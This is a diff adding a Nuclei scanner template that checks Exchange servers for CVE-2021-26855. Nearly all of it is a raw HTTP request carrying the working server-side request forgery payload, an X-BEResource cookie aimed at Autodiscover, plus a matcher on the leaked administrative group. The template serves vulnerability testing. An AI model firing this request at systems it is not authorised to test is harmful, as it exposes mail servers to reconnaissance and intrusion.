@@ -1,0 +1,44 @@
+id: check_CVE-2021-26855
+info:
+  name: check_CVE-2021-26855
+  author: 51pwn
+  severity: critical
+  description: |+
+    https://saucer-man.com/information_security/748.html
+  reference:
+    - https://github.com/hktalent/nuclei-templates
+    - https://51pwn.com
+  tags: web,go,microsoft,exchange,outlook
+
+# nuclei -duc -u http://localhost:9999 -t ./51pwn/checkGoDebug.yaml
+
+requests:
+  - raw:
+      - |+
+        POST /ecp/target.js HTTP/1.1
+        Host: {{Host}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Cookie: X-BEResource=[name]@{{Host}}/autodiscover/autodiscover.xml?#~1941962754
+        Content-Type: text/xml
+
+        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
+        <Request>
+        <EMailAddress>administrator@saucerman.com</EMailAddress>
+        <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
+        </Request>
+        </Autodiscover>
+        
+      # end payload
+    unsafe: true
+
+    req-condition: true
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Organization/ou=Exchange Administrative Group'
+        condition: and
